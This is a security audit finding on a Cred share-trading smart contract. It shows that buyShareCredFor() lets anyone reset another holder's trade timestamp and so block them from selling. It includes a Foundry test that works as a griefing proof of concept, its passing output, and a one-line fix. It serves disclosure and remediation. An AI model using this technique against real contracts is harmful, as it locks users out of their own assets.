# Vulnerability details

## Impact
A share holder is allowed to sell his share if lock duration passes since his last trade timestamp. The last trade timestamp is updated when he buys Cred share.
However, there is a function `Cred#buyShareCredFor()` allows an user to buy share for others. This also updates last trade timestamp for the receiver, which will block the receiver from selling Cred shares for a `SHARE_LOCK_PERIOD` duration.

## Proof of Concept
Modify the test file `test/Cred.t.sol` as below:
```diff
    function test_SellAction() public {
        // NORMAL BUY
        _createCred("BASIC", "SIGNATURE", 0x0);
        vm.startPrank(anyone);
        uint256 buyPrice = bondingCurve.getBuyPriceAfterFee(1, 1, 1);
        uint256 maxPrice = bondingCurve.getBuyPriceAfterFee(1, 1, 2);

        cred.buyShareCred{ value: buyPrice }(1, 1, maxPrice);
        assertEq(cred.isShareHolder(1, anyone), true, "cred 1 is voted by anyone");
        vm.warp(block.timestamp + 10 minutes + 1 seconds);

        address victim = anyone;
        // MALICIOUS BUY FOR VICTIM
        address malicious = makeAddr("malicious");
        vm.startPrank(malicious);
        deal(malicious, 100 ether);
        buyPrice = bondingCurve.getBuyPriceAfterFee(1, 2, 1);
        cred.buyShareCredFor{ value: buyPrice }(1, 1, victim, 0); // buy cred for victim
        
        // VICTIM is blocked
        vm.startPrank(victim);
        vm.expectRevert();
        cred.sellShareCred(1, 1, 0);
    }
```

Run the test, and console shows:
```bash
Ran 1 test for test/Cred.t.sol:TestCred
[PASS] test_SellAction() (gas: 815809)
```

## Recommended Mitigation Steps
Consider updating last trade timestamp for caller in case Cred buys:

```diff
-lastTradeTimestamp[credId_][curator_] = block.timestamp;
+lastTradeTimestamp[credId_][_msgSender()] = block.timestamp;
```
